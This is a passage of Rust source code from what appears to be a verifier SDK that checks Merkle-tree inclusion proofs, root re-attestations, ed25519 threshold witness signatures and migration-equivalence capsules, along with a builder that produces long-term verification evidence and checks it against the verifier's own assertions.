        MMR_ROOT_WITNESS_CONNECTOR_ID,
    ) {
        return Err("root witness connector_id mismatch".to_string());
    }
    if !constant_time_eq(
        &receipt.witness_artifact.content_hash,
        &receipt.statement.content_hash,
    ) {
        return Err("root witness artifact content_hash mismatch".to_string());
    }
    if receipt.witness_artifact.signatures.len() > MAX_LONG_TERM_WITNESS_SIGNATURES {
        return Err(format!(
            "root witness signatures len={} exceeds limit={MAX_LONG_TERM_WITNESS_SIGNATURES}",
            receipt.witness_artifact.signatures.len()
        ));
    }
    let (valid_signatures, threshold) =
        verify_long_term_threshold(&receipt.threshold_config, &receipt.witness_artifact)?;
    Ok(LongTermWitnessVerification {
        root: receipt.statement.root.clone(),
        observed_at_unix_seconds: receipt.statement.observed_at_unix_seconds,
        valid_signatures,
        threshold,
    })
}

fn verify_long_term_threshold(
    config: &LongTermThresholdConfig,
    artifact: &LongTermPublicationArtifact,
) -> Result<(u32, u32), String> {
    if config.threshold == 0 {
        return Err("threshold must be > 0".to_string());
    }
    if config.threshold > config.total_signers {
        return Err(format!(
            "threshold {} exceeds total_signers {}",
            config.threshold, config.total_signers
        ));
    }
    if config.signer_keys.len() > MAX_LONG_TERM_SIGNER_KEYS {
        return Err(format!(
            "signer_keys len={} exceeds limit={MAX_LONG_TERM_SIGNER_KEYS}",
            config.signer_keys.len()
        ));
    }
    if u32::try_from(config.signer_keys.len()).unwrap_or(u32::MAX) != config.total_signers {
        return Err(format!(
            "signer_keys count {} != total_signers {}",
            config.signer_keys.len(),
            config.total_signers
        ));
    }

    let mut keys = BTreeMap::new();
    let mut public_keys = BTreeSet::new();
    for signer in &config.signer_keys {
        validate_long_term_identifier("signer key_id", &signer.key_id)?;
        if !public_keys.insert(signer.public_key_hex.to_ascii_lowercase()) {
            return Err("duplicate signer public_key_hex".to_string());
        }
        let public_key = parse_long_term_verifying_key(&signer.public_key_hex)
            .ok_or_else(|| format!("invalid public_key_hex for {}", signer.key_id))?;
        if keys.insert(signer.key_id.clone(), public_key).is_some() {
            return Err(format!("duplicate signer key_id {}", signer.key_id));
        }
    }

    let message = long_term_threshold_signing_message(
        &artifact.artifact_id,
        &artifact.connector_id,
        &artifact.content_hash,
    );
    let mut seen_key_ids = BTreeSet::new();
    let mut valid_signatures = 0u32;
    let mut first_failure: Option<String> = None;
    for partial in &artifact.signatures {
        if let Err(reason) =
            validate_long_term_identifier("signature signer_id", &partial.signer_id)
        {
            first_failure.get_or_insert(reason);
            continue;
        }
        if let Err(reason) = validate_long_term_identifier("signature key_id", &partial.key_id) {
            first_failure.get_or_insert(reason);
            continue;
        }
        if !constant_time_eq(&partial.signer_id, &partial.key_id) {
            first_failure.get_or_insert_with(|| "signer_id must match key_id".to_string());
            continue;
        }
        let Some(verifying_key) = keys.get(&partial.key_id) else {
            first_failure.get_or_insert_with(|| format!("unknown signer {}", partial.key_id));
            continue;
        };
        let Some(signature) = parse_long_term_signature(&partial.signature_hex) else {
            first_failure
                .get_or_insert_with(|| format!("invalid signature for {}", partial.key_id));
            continue;
        };
        if verifying_key.verify_strict(&message, &signature).is_err() {
            first_failure
                .get_or_insert_with(|| format!("invalid signature for {}", partial.key_id));
            continue;
        }
        if !seen_key_ids.insert(partial.key_id.as_str()) {
            first_failure.get_or_insert_with(|| format!("duplicate signer {}", partial.key_id));
            continue;
        }
        valid_signatures = valid_signatures.saturating_add(1);
    }

    if valid_signatures >= config.threshold {
        Ok((valid_signatures, config.threshold))
    } else {
        Err(first_failure.unwrap_or_else(|| {
            format!(
                "below threshold: valid_signatures={} threshold={}",
                valid_signatures, config.threshold
            )
        }))
    }
}

fn validate_long_term_witness_statement(
    statement: &LongTermMmrRootWitnessStatement,
) -> Result<(), String> {
    if statement.schema_version != MMR_ROOT_WITNESS_SCHEMA_VERSION {
        return Err(format!(
            "unsupported root witness schema_version={}",
            statement.schema_version
        ));
    }
    validate_long_term_root(&statement.root)?;
    if statement.observed_at_unix_seconds == 0 {
        return Err("observed_at_unix_seconds must be nonzero".to_string());
    }
    validate_long_term_identifier("witness_group_id", &statement.witness_group_id)?;
    validate_long_term_identifier("witness_policy_id", &statement.witness_policy_id)?;
    let expected_hash = compute_long_term_witness_content_hash(statement);
    if !constant_time_eq(&expected_hash, &statement.content_hash) {
        return Err("root witness content_hash mismatch".to_string());
    }
    Ok(())
}

fn validate_long_term_root(root: &LongTermMmrRoot) -> Result<(), String> {
    if root.tree_size == 0 {
        return Err("MMR root tree_size must be nonzero".to_string());
    }
    if !is_canonical_sha256_hex(&root.root_hash) {
        return Err("MMR root_hash must be a canonical lowercase sha256 digest".to_string());
    }
    Ok(())
}

fn validate_long_term_identifier(field_name: &str, value: &str) -> Result<(), String> {
    validate_long_term_text(field_name, value)?;
    if value.len() > 128 {
        return Err(format!("{field_name} exceeds maximum length of 128 bytes"));
    }
    if !value
        .bytes()
        .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_' | b'.'))
    {
        return Err(format!(
            "{field_name} contains unsafe identifier characters"
        ));
    }
    Ok(())
}

fn validate_long_term_text(field_name: &str, value: &str) -> Result<(), String> {
    if value.is_empty() || value.trim() != value {
        return Err(format!("{field_name} must be nonempty and canonical"));
    }
    if value.contains('\0') {
        return Err(format!("{field_name} must not contain null bytes"));
    }
    Ok(())
}

fn long_term_artifact_marker_hash(artifact: &LongTermArtifactEvidence) -> String {
    let mut hasher = Sha256::new();
    hasher.update(LONG_TERM_ARTIFACT_MARKER_HASH_DOMAIN);
    update_long_term_hash_string(&mut hasher, &artifact.artifact_id);
    update_long_term_hash_string(&mut hasher, &artifact.artifact_hash);
    update_long_term_hash_string(&mut hasher, &artifact.crypto_suite);
    hasher.update(artifact.claimed_at_unix_seconds.to_le_bytes());
    hex::encode(hasher.finalize())
}

fn compute_long_term_reattestation_hash(reattestation: &LongTermMmrRootReattestation) -> String {
    let mut hasher = Sha256::new();
    hasher.update(MMR_ROOT_REATTESTATION_HASH_DOMAIN);
    update_long_term_hash_string(&mut hasher, &reattestation.schema_version);
    update_long_term_root_for_hash(&mut hasher, &reattestation.previous_root);
    update_long_term_root_for_hash(&mut hasher, &reattestation.attested_root);
    update_long_term_prefix_for_hash(&mut hasher, &reattestation.prefix_proof);
    hasher.update(reattestation.issued_at_unix_seconds.to_le_bytes());
    update_long_term_hash_string(&mut hasher, &reattestation.crypto_suite);
    hex::encode(hasher.finalize())
}

fn compute_long_term_witness_content_hash(statement: &LongTermMmrRootWitnessStatement) -> String {
    let mut hasher = Sha256::new();
    hasher.update(MMR_ROOT_WITNESS_HASH_DOMAIN);
    update_long_term_hash_string(&mut hasher, &statement.schema_version);
    update_long_term_root_for_hash(&mut hasher, &statement.root);
    hasher.update(statement.observed_at_unix_seconds.to_le_bytes());
    update_long_term_hash_string(&mut hasher, &statement.witness_group_id);
    update_long_term_hash_string(&mut hasher, &statement.witness_policy_id);
    hex::encode(hasher.finalize())
}

fn update_long_term_root_for_hash(hasher: &mut Sha256, root: &LongTermMmrRoot) {
    hasher.update(root.tree_size.to_le_bytes());
    update_long_term_hash_string(hasher, &root.root_hash);
}

fn update_long_term_prefix_for_hash(hasher: &mut Sha256, proof: &LongTermMmrPrefixProof) {
    hasher.update(proof.prefix_size.to_le_bytes());
    hasher.update(proof.super_tree_size.to_le_bytes());
    update_long_term_hash_string(hasher, &proof.prefix_root_hash);
    update_long_term_hash_string(hasher, &proof.super_root_hash);
    update_long_term_hash_string(hasher, &proof.prefix_root_from_super);
    hasher.update(long_term_len_to_u64(proof.super_leaf_hashes.len()).to_le_bytes());
    for leaf_hash in &proof.super_leaf_hashes {
        update_long_term_hash_string(hasher, leaf_hash);
    }
}

fn update_long_term_hash_string(hasher: &mut Sha256, value: &str) {
    hasher.update(long_term_len_to_u64(value.len()).to_le_bytes());
    hasher.update(value.as_bytes());
}

fn long_term_marker_leaf_hash(marker_hash: &str) -> String {
    let mut hasher = Sha256::new();
    hasher.update(MMR_LEAF_HASH_DOMAIN);
    hasher.update(long_term_len_to_u64(marker_hash.len()).to_le_bytes());
    hasher.update(marker_hash.as_bytes());
    hex::encode(hasher.finalize())
}

fn long_term_inclusion_root_from_proof(
    proof: &LongTermMmrInclusionProof,
) -> Result<String, String> {
    if !is_canonical_sha256_hex(&proof.leaf_hash) {
        return Err("inclusion leaf_hash must be canonical".to_string());
    }
    let mut current = proof.leaf_hash.clone();
    let mut index = usize::try_from(proof.leaf_index).map_err(|_| {
        format!(
            "leaf_index={} cannot be represented locally",
            proof.leaf_index
        )
    })?;
    for sibling in &proof.audit_path {
        current = if index % 2 == 0 {
            long_term_hash_pair(&current, sibling)?
        } else {
            long_term_hash_pair(sibling, &current)?
        };
        index /= 2;
    }
    Ok(current)
}

fn long_term_merkle_root_from_leaf_hashes(leaf_hashes: &[String]) -> Option<String> {
    if leaf_hashes.is_empty() || !leaf_hashes.iter().all(|hash| is_canonical_sha256_hex(hash)) {
        return None;
    }
    let mut level = leaf_hashes.to_vec();
    while level.len() > 1 {
        if level.len() % 2 == 1 {
            level.push(level.last()?.clone());
        }
        let mut next = Vec::with_capacity(level.len() / 2);
        for chunk in level.chunks(2) {
            next.push(long_term_hash_pair(&chunk[0], &chunk[1]).ok()?);
        }
        level = next;
    }
    level.into_iter().next()
}

fn long_term_hash_pair(left: &str, right: &str) -> Result<String, String> {
    if !is_canonical_sha256_hex(left) || !is_canonical_sha256_hex(right) {
        return Err("MMR node children must be canonical lowercase sha256 digests".to_string());
    }
    let mut hasher = Sha256::new();
    hasher.update(MMR_NODE_HASH_DOMAIN);
    hasher.update(64_u64.to_le_bytes());
    hasher.update(left.as_bytes());
    hasher.update(64_u64.to_le_bytes());
    hasher.update(right.as_bytes());
    Ok(hex::encode(hasher.finalize()))
}

fn long_term_threshold_signing_message(
    artifact_id: &str,
    connector_id: &str,
    content_hash: &str,
) -> Vec<u8> {
    let mut message = Vec::with_capacity(
        THRESHOLD_SIGNING_MESSAGE_DOMAIN.len()
            + 24
            + artifact_id.len()
            + connector_id.len()
            + content_hash.len(),
    );
    message.extend_from_slice(THRESHOLD_SIGNING_MESSAGE_DOMAIN);
    push_length_prefixed(&mut message, artifact_id.as_bytes());
    push_length_prefixed(&mut message, connector_id.as_bytes());
    push_length_prefixed(&mut message, content_hash.as_bytes());
    message
}

fn parse_long_term_verifying_key(public_key_hex: &str) -> Option<VerifyingKey> {
    if public_key_hex.len() != 64 {
        return None;
    }
    let mut bytes = [0_u8; 32];
    hex::decode_to_slice(public_key_hex, &mut bytes).ok()?;
    VerifyingKey::from_bytes(&bytes).ok()
}

fn parse_long_term_signature(signature_hex: &str) -> Option<ed25519_dalek::Signature> {
    if signature_hex.len() != 128 {
        return None;
    }
    let mut bytes = [0_u8; 64];
    hex::decode_to_slice(signature_hex, &mut bytes).ok()?;
    Some(ed25519_dalek::Signature::from_bytes(&bytes))
}

fn long_term_len_to_u64(len: usize) -> u64 {
    u64::try_from(len).unwrap_or(u64::MAX)
}

// ---------------------------------------------------------------------------
// Long-term verification evidence producer (public builder)
// ---------------------------------------------------------------------------

/// One producer-side witness signer used to threshold-cosign the root
/// witness statement of a [`LongTermVerificationEvidence`].
pub struct LongTermWitnessSigner {
    pub key_id: String,
    pub signing_key: SigningKey,
}

impl fmt::Debug for LongTermWitnessSigner {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.debug_struct("LongTermWitnessSigner")
            .field("key_id", &self.key_id)
            .finish_non_exhaustive()
    }
}

/// Producer-side request describing the artifact, log markers, timeline, and
/// witness policy from which [`build_long_term_verification_evidence`]
/// assembles self-contained LTV evidence.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct LongTermEvidenceRequest {
    /// Identifier of the artifact whose anteriority is being attested.
    pub artifact_id: String,
    /// Canonical lowercase sha256 digest of the artifact bytes.
    pub artifact_hash: String,
    /// Crypto suite discriminator under which the artifact was produced.
    pub crypto_suite: String,
    /// Unix time at which the artifact claims to have existed.
    pub claimed_at_unix_seconds: u64,
    /// Additional canonical sha256 marker hashes committed alongside the
    /// artifact in the origin tree (for example, effect receipt chain
    /// hashes); the artifact marker leaf always sits at leaf index 0.
    pub co_marker_hashes: Vec<String>,
    /// Marker hashes appended to the log between the origin root and the
    /// re-attested root; empty re-attests the origin root unchanged.
    pub reattestation_appended_marker_hashes: Vec<String>,
    /// Unix time the re-attestation link is issued.
    pub reattested_at_unix_seconds: u64,
    /// Unix time the independent witnesses observed the re-attested root.
    pub observed_at_unix_seconds: u64,
    /// Verification target time; the witness observation must be anterior.
    pub as_of_unix_seconds: u64,
    /// Unix time from which the crypto suite is on record as valid.
    pub suite_valid_from_unix_seconds: u64,
    pub witness_group_id: String,
    pub witness_policy_id: String,
    /// Minimum number of valid witness signatures the receipt requires.
    pub witness_threshold: u32,
    pub trace_id: String,
    /// RFC 3339 timestamp recorded on the witness receipt.
    pub timestamp: String,
}

/// Assemble self-contained [`LongTermVerificationEvidence`] on the producer
/// side, failing closed unless the exact assertion set behind
/// [`VerifierSdk::verify_as_of_ltv`] accepts the result.
///
/// The origin tree commits the artifact marker leaf at index 0 followed by
/// one leaf per `co_marker_hashes` entry; the single re-attestation link
/// extends the origin tree with `reattestation_appended_marker_hashes` (or
/// re-attests it unchanged) and every supplied signer cosigns the canonical
/// witness statement over the newest root. All LTV hashing stays inside this
/// crate so producers and verifiers can never drift.
///
/// # Errors
///
/// Returns a description of the first violated constraint: no signers, a
/// zero or unsatisfiable threshold, a non-canonical marker hash, an invalid
/// artifact field, or produced evidence that fails any of the verifier's own
/// LTV assertions.
pub fn build_long_term_verification_evidence(
    request: &LongTermEvidenceRequest,
    witness_signers: &[LongTermWitnessSigner],
) -> Result<LongTermVerificationEvidence, String> {
    if witness_signers.is_empty() {
        return Err("at least one witness signer is required".to_string());
    }
    if request.witness_threshold == 0 {
        return Err("witness_threshold must be > 0".to_string());
    }
    let total_signers =
        u32::try_from(witness_signers.len()).map_err(|_| "too many witness signers".to_string())?;
    if request.witness_threshold > total_signers {
        return Err(format!(
            "witness_threshold {} exceeds supplied signer count {}",
            request.witness_threshold, total_signers
        ));
    }
    for marker in request
        .co_marker_hashes
        .iter()
        .chain(&request.reattestation_appended_marker_hashes)
    {
        if !is_canonical_sha256_hex(marker) {
            return Err(format!(
                "marker hash `{marker}` must be a canonical lowercase sha256 digest"
            ));
        }
    }

    let mut artifact = LongTermArtifactEvidence {
        artifact_id: request.artifact_id.clone(),
        artifact_hash: request.artifact_hash.clone(),
        crypto_suite: request.crypto_suite.clone(),
        claimed_at_unix_seconds: request.claimed_at_unix_seconds,
        marker_hash: String::new(),
    };
    artifact.marker_hash = long_term_artifact_marker_hash(&artifact);
    validate_long_term_artifact(&artifact)?;

    let mut origin_leaf_hashes = Vec::with_capacity(1 + request.co_marker_hashes.len());
    origin_leaf_hashes.push(long_term_marker_leaf_hash(&artifact.marker_hash));
    origin_leaf_hashes.extend(
        request
            .co_marker_hashes
            .iter()
            .map(|marker| long_term_marker_leaf_hash(marker)),
    );
    let origin_root_hash = long_term_merkle_root_from_leaf_hashes(&origin_leaf_hashes)
        .ok_or_else(|| "origin root computation failed".to_string())?;
    let origin_root = LongTermMmrRoot {
        tree_size: long_term_len_to_u64(origin_leaf_hashes.len()),
        root_hash: origin_root_hash,
    };
    let inclusion_proof = LongTermMmrInclusionProof {
        leaf_index: 0,
        tree_size: origin_root.tree_size,
        leaf_hash: origin_leaf_hashes[0].clone(),
        audit_path: long_term_audit_path(&origin_leaf_hashes, 0)?,
    };

    let mut super_leaf_hashes = origin_leaf_hashes.clone();
    super_leaf_hashes.extend(
        request
            .reattestation_appended_marker_hashes
            .iter()
            .map(|marker| long_term_marker_leaf_hash(marker)),
    );
    let attested_root_hash = long_term_merkle_root_from_leaf_hashes(&super_leaf_hashes)
        .ok_or_else(|| "attested root computation failed".to_string())?;
    let attested_root = LongTermMmrRoot {
        tree_size: long_term_len_to_u64(super_leaf_hashes.len()),
        root_hash: attested_root_hash,
    };
    let mut reattestation = LongTermMmrRootReattestation {
        schema_version: MMR_ROOT_REATTESTATION_SCHEMA_VERSION.to_string(),
        previous_root: origin_root.clone(),
        attested_root: attested_root.clone(),
        prefix_proof: LongTermMmrPrefixProof {
            prefix_size: origin_root.tree_size,
            super_tree_size: attested_root.tree_size,
            prefix_root_hash: origin_root.root_hash.clone(),
            super_root_hash: attested_root.root_hash.clone(),
            prefix_root_from_super: origin_root.root_hash.clone(),
            super_leaf_hashes,
        },
        issued_at_unix_seconds: request.reattested_at_unix_seconds,
        crypto_suite: request.crypto_suite.clone(),
        attestation_hash: String::new(),
    };
    reattestation.attestation_hash = compute_long_term_reattestation_hash(&reattestation);

    let mut statement = LongTermMmrRootWitnessStatement {
        schema_version: MMR_ROOT_WITNESS_SCHEMA_VERSION.to_string(),
        root: attested_root,
        observed_at_unix_seconds: request.observed_at_unix_seconds,
        witness_group_id: request.witness_group_id.clone(),
        witness_policy_id: request.witness_policy_id.clone(),
        content_hash: String::new(),
    };
    statement.content_hash = compute_long_term_witness_content_hash(&statement);

    let signer_keys = witness_signers
        .iter()
        .map(|signer| LongTermSignerKey {
            key_id: signer.key_id.clone(),
            public_key_hex: hex::encode(signer.signing_key.verifying_key().to_bytes()),
        })
        .collect();
    let threshold_config = LongTermThresholdConfig {
        threshold: request.witness_threshold,
        total_signers,
        signer_keys,
    };
    let message = long_term_threshold_signing_message(
        MMR_ROOT_WITNESS_ARTIFACT_ID,
        MMR_ROOT_WITNESS_CONNECTOR_ID,
        &statement.content_hash,
    );
    let signatures = witness_signers
        .iter()
        .map(|signer| LongTermPartialSignature {
            signer_id: signer.key_id.clone(),
            key_id: signer.key_id.clone(),
            signature_hex: hex::encode(signer.signing_key.sign(&message).to_bytes()),
        })
        .collect();
    let witness_artifact = LongTermPublicationArtifact {
        artifact_id: MMR_ROOT_WITNESS_ARTIFACT_ID.to_string(),
        connector_id: MMR_ROOT_WITNESS_CONNECTOR_ID.to_string(),
        content_hash: statement.content_hash.clone(),
        signatures,
    };

    let evidence = LongTermVerificationEvidence {
        schema_version: LONG_TERM_VERIFICATION_SCHEMA_VERSION.to_string(),
        as_of_unix_seconds: request.as_of_unix_seconds,
        artifact,
        suite_records: vec![LongTermCryptoSuiteRecord {
            crypto_suite: request.crypto_suite.clone(),
            valid_from_unix_seconds: request.suite_valid_from_unix_seconds,
            valid_until_unix_seconds: None,
            compromised_at_unix_seconds: None,
        }],
        inclusion_proof,
        reattestation_chain: LongTermMmrRootReattestationChain {
            origin_root,
            attestations: vec![reattestation],
        },
        witness_receipt: LongTermMmrRootWitnessReceipt {
            statement,
            threshold_config,
            witness_artifact,
            trace_id: request.trace_id.clone(),
            timestamp: request.timestamp.clone(),
        },
    };

    let verification = verify_long_term_evidence(&evidence);
    if let Some(failed) = verification
        .checked_assertions
        .iter()
        .find(|assertion| !assertion.passed)
    {
        return Err(format!(
            "produced evidence fails its own verification: {}: {}",
            failed.assertion, failed.detail
        ));
    }
    Ok(evidence)
}

/// Audit path for `leaf_index` in the same duplicate-last-odd binary tree
/// shape that inclusion verification recomputes.
fn long_term_audit_path(leaf_hashes: &[String], leaf_index: usize) -> Result<Vec<String>, String> {
    if leaf_index >= leaf_hashes.len() {
        return Err(format!(
            "leaf_index={leaf_index} is outside a tree of {} leaves",
            leaf_hashes.len()
        ));
    }
    let mut path = Vec::new();
    let mut level = leaf_hashes.to_vec();
    let mut index = leaf_index;
    while level.len() > 1 {
        if level.len() % 2 == 1 {
            let last = level
                .last()
                .cloned()
                .ok_or_else(|| "audit path level unexpectedly empty".to_string())?;
            level.push(last);
        }
        let sibling_index = if index.is_multiple_of(2) {
            index + 1
        } else {
            index - 1
        };
        let sibling = level
            .get(sibling_index)
            .cloned()
            .ok_or_else(|| "audit path sibling out of bounds".to_string())?;
        path.push(sibling);
        let mut next = Vec::with_capacity(level.len() / 2);
        for pair in level.chunks(2) {
            next.push(long_term_hash_pair(&pair[0], &pair[1])?);
        }
        level = next;
        index /= 2;
    }
    Ok(path)
}

#[derive(Debug)]
struct MigrationEquivalenceVerification {
    checked_assertions: Vec<AssertionResult>,
    artifact_binding_hash: String,
}

impl MigrationEquivalenceVerification {
    fn all_passed(&self) -> bool {
        self.checked_assertions
            .iter()
            .all(|assertion| assertion.passed)
    }
}

#[derive(Debug, Serialize, Deserialize)]
struct MigrationEquivalenceCapsule {
    schema_version: String,
    rule_id: String,
    source: MigrationSourceSnapshot,
    target: MigrationSourceSnapshot,
    precondition: MigrationPreconditionProof,
    lockstep_witness: MigrationLockstepWitness,
}

#[derive(Debug, Serialize, Deserialize)]
struct MigrationSourceSnapshot {
    path: String,
    source_text: String,
    source_hash: String,
    ast_hash: String,
}

#[derive(Debug, Serialize, Deserialize)]
struct MigrationPreconditionProof {
    rule_id: String,
    #[serde(default)]
    source_contains: Vec<String>,
    #[serde(default)]
    source_not_contains: Vec<String>,
    #[serde(default)]
    target_contains: Vec<String>,
    #[serde(default)]
    target_not_contains: Vec<String>,
    passed: bool,
}

#[derive(Debug, Serialize, Deserialize)]
struct MigrationLockstepWitness {
    lockstep_oracle_id: String,
    fixture_corpus_digest: String,
    proptest_seed: String,
    fixture_cases: u64,
    proptest_cases: u64,
    effect_receipt_equivalence_cases: u64,
    #[serde(default)]
    effect_receipt_ids: Vec<String>,
    divergence_count: u64,
    verdict: String,
    lockstep_verdict_hash: String,
}

fn verify_migration_equivalence_capsule(
    replay_bundle: &bundle::ReplayBundle,
) -> MigrationEquivalenceVerification {
    let mut assertions = vec![AssertionResult {
        assertion: "migration_bundle_structural_verified".to_string(),
        passed: true,
        detail: format!(
            "migration artifact bundle {} passed canonical bundle verification",
            replay_bundle.bundle_id
        ),
    }];

    let Some(capsule_artifact) = replay_bundle
        .artifacts
        .get(MIGRATION_EQUIVALENCE_ARTIFACT_PATH)
    else {
        assertions.push(AssertionResult {
            assertion: "migration_equivalence_capsule_present".to_string(),
            passed: false,
            detail: format!("missing required artifact {MIGRATION_EQUIVALENCE_ARTIFACT_PATH}"),
        });
        return MigrationEquivalenceVerification {
            artifact_binding_hash: migration_equivalence_binding_hash(
                &replay_bundle.integrity_hash,
                "",
                "",
                "",
            ),
            checked_assertions: assertions,
        };
    };

    assertions.push(AssertionResult {
        assertion: "migration_equivalence_capsule_present".to_string(),
        passed: true,
        detail: format!("found {MIGRATION_EQUIVALENCE_ARTIFACT_PATH}"),
    });

    let media_type_ok = capsule_artifact.media_type == "application/json"
        || capsule_artifact.media_type == "application/vnd.franken-node.migration-equivalence+json";
    assertions.push(AssertionResult {
        assertion: "migration_equivalence_capsule_media_type".to_string(),
        passed: media_type_ok,
        detail: if media_type_ok {
            capsule_artifact.media_type.clone()
        } else {
            format!("unsupported media type {}", capsule_artifact.media_type)
        },
    });

    let capsule_bytes = match Vec::from_hex(&capsule_artifact.bytes_hex) {
        Ok(bytes) => bytes,
        Err(error) => {
            assertions.push(AssertionResult {
                assertion: "migration_equivalence_capsule_json".to_string(),
                passed: false,
                detail: format!("capsule bytes were not valid hex: {error}"),
            });
            return MigrationEquivalenceVerification {
                artifact_binding_hash: migration_equivalence_binding_hash(
                    &replay_bundle.integrity_hash,
                    "",
                    "",
                    "",
                ),
                checked_assertions: assertions,
            };
        }
    };

    let capsule = match serde_json::from_slice::<MigrationEquivalenceCapsule>(&capsule_bytes) {
        Ok(capsule) => {
            assertions.push(AssertionResult {
                assertion: "migration_equivalence_capsule_json".to_string(),
                passed: true,
                detail: "capsule JSON decoded".to_string(),
            });
            capsule
        }
        Err(error) => {
            assertions.push(AssertionResult {
                assertion: "migration_equivalence_capsule_json".to_string(),
                passed: false,
                detail: format!("capsule JSON rejected: {error}"),
            });
            return MigrationEquivalenceVerification {
                artifact_binding_hash: migration_equivalence_binding_hash(
                    &replay_bundle.integrity_hash,
                    "",
                    "",
                    "",
                ),
                checked_assertions: assertions,
            };
        }
    };

    let schema_ok = capsule.schema_version == MIGRATION_EQUIVALENCE_SCHEMA_VERSION;
    assertions.push(AssertionResult {
        assertion: "migration_equivalence_schema_version".to_string(),
        passed: schema_ok,
        detail: if schema_ok {
            capsule.schema_version.clone()
        } else {
            format!(
                "expected {}, got {}",
                MIGRATION_EQUIVALENCE_SCHEMA_VERSION, capsule.schema_version
            )
        },
    });

    let rule_ok =
        !capsule.rule_id.trim().is_empty() && capsule.rule_id == capsule.precondition.rule_id;
    assertions.push(AssertionResult {
        assertion: "migration_equivalence_rule_bound".to_string(),
        passed: rule_ok,
        detail: if rule_ok {
            format!("rule_id={}", capsule.rule_id)
        } else {
            "capsule rule_id is empty or not bound to precondition proof".to_string()
        },
    });

    let source_hash = verify_migration_source_snapshot("source", &capsule.source, &mut assertions);
    let target_hash = verify_migration_source_snapshot("target", &capsule.target, &mut assertions);
    let source_ast_hash = verify_migration_ast_snapshot("source", &capsule.source, &mut assertions);
    let target_ast_hash = verify_migration_ast_snapshot("target", &capsule.target, &mut assertions);
    verify_migration_precondition(&capsule, &mut assertions);
    verify_migration_effect_receipts(replay_bundle, &capsule, &mut assertions);
    verify_migration_lockstep_witness(&capsule, &mut assertions);

    let recomputed_lockstep_hash = compute_migration_lockstep_verdict_hash(
        &capsule,
        &source_hash,
        &target_hash,
        &source_ast_hash,
        &target_ast_hash,
    );
    let lockstep_hash_ok = is_canonical_sha256_hex(&capsule.lockstep_witness.lockstep_verdict_hash)
        && constant_time_eq(
            &capsule.lockstep_witness.lockstep_verdict_hash,
            &recomputed_lockstep_hash,
        );
    assertions.push(AssertionResult {
        assertion: "migration_lockstep_verdict_hash_recomputed".to_string(),
        passed: lockstep_hash_ok,
        detail: if lockstep_hash_ok {
            "lockstep verdict hash matched SDK recomputation".to_string()
        } else {
            "lockstep verdict hash did not match SDK recomputation".to_string()
        },
    });

    MigrationEquivalenceVerification {
        artifact_binding_hash: migration_equivalence_binding_hash(
            &replay_bundle.integrity_hash,
            &recomputed_lockstep_hash,
            &source_ast_hash,
            &target_ast_hash,
        ),
        checked_assertions: assertions,
    }
}

fn verify_migration_source_snapshot(
    label: &'static str,
    snapshot: &MigrationSourceSnapshot,
    assertions: &mut Vec<AssertionResult>,
) -> String {
    let path_ok = !snapshot.path.trim().is_empty() && snapshot.path == snapshot.path.trim();
    assertions.push(AssertionResult {
        assertion: format!("migration_{label}_path_canonical"),
        passed: path_ok,
        detail: if path_ok {
            snapshot.path.clone()
        } else {
            "path must be non-empty without surrounding whitespace".to_string()
        },
    });

    let source_nonempty = !snapshot.source_text.trim().is_empty();
    assertions.push(AssertionResult {
        assertion: format!("migration_{label}_source_present"),
        passed: source_nonempty,
        detail: if source_nonempty {
            format!("{} bytes", snapshot.source_text.len())
        } else {
            "source text is empty".to_string()
        },
    });

    let recomputed = compute_migration_source_hash(&snapshot.source_text);
    let hash_ok = is_canonical_sha256_hex(&snapshot.source_hash)
        && constant_time_eq(&snapshot.source_hash, &recomputed);
    assertions.push(AssertionResult {
        assertion: format!("migration_{label}_source_hash_recomputed"),
        passed: hash_ok,
        detail: if hash_ok {
            "source hash matched SDK recomputation".to_string()
        } else {
            "source hash did not match SDK recomputation".to_string()
        },
    });
    recomputed
}

fn verify_migration_ast_snapshot(
    label: &'static str,
    snapshot: &MigrationSourceSnapshot,
    assertions: &mut Vec<AssertionResult>,
) -> String {
    match compute_js_ast_hash(&snapshot.source_text) {
        Ok(recomputed) => {
            let ast_ok = is_canonical_sha256_hex(&snapshot.ast_hash)
                && constant_time_eq(&snapshot.ast_hash, &recomputed);
            assertions.push(AssertionResult {
                assertion: format!("migration_{label}_ast_reparsed"),
                passed: ast_ok,
                detail: if ast_ok {
                    "JavaScript AST hash matched SDK parse".to_string()
                } else {
                    "JavaScript AST hash did not match SDK parse".to_string()
                },
            });
            recomputed
        }
        Err(error) => {
            assertions.push(AssertionResult {
                assertion: format!("migration_{label}_ast_reparsed"),
                passed: false,
                detail: error,
            });
            String::new()
        }
    }
}

fn verify_migration_precondition(
    capsule: &MigrationEquivalenceCapsule,
    assertions: &mut Vec<AssertionResult>,
) {
    let proof = &capsule.precondition;
    let clauses_present = !proof.source_contains.is_empty()
        || !proof.source_not_contains.is_empty()
        || !proof.target_contains.is_empty()
        || !proof.target_not_contains.is_empty();
    let fragments_nonempty = proof
        .source_contains
        .iter()
        .chain(&proof.source_not_contains)
        .chain(&proof.target_contains)
        .chain(&proof.target_not_contains)
        .all(|fragment| !fragment.is_empty());
    assertions.push(AssertionResult {
        assertion: "migration_precondition_machine_readable".to_string(),
        passed: clauses_present && fragments_nonempty,
        detail: if clauses_present && fragments_nonempty {
            "precondition clauses are explicit".to_string()
        } else {
            "precondition proof must include non-empty machine-checkable clauses".to_string()
        },
    });

    let recomputed = clauses_present
        && fragments_nonempty
        && proof
            .source_contains
            .iter()
            .all(|fragment| capsule.source.source_text.contains(fragment))
        && proof
            .source_not_contains
            .iter()
            .all(|fragment| !capsule.source.source_text.contains(fragment))
        && proof
            .target_contains
            .iter()
            .all(|fragment| capsule.target.source_text.contains(fragment))
        && proof
            .target_not_contains
            .iter()
            .all(|fragment| !capsule.target.source_text.contains(fragment));
    let precondition_ok = proof.passed && recomputed;
    assertions.push(AssertionResult {
        assertion: "migration_precondition_rechecked".to_string(),
        passed: precondition_ok,
        detail: if precondition_ok {
            "precondition proof recomputed as pass".to_string()
        } else {
            format!(
                "precondition proof failed SDK recomputation: claimed={}, recomputed={}",
                proof.passed, recomputed
            )
        },
    });
}

fn verify_migration_effect_receipts(
    replay_bundle: &bundle::ReplayBundle,
    capsule: &MigrationEquivalenceCapsule,
    assertions: &mut Vec<AssertionResult>,
) {
    let referenced_ids = &capsule.lockstep_witness.effect_receipt_ids;
    let ids_nonempty = !referenced_ids.is_empty();
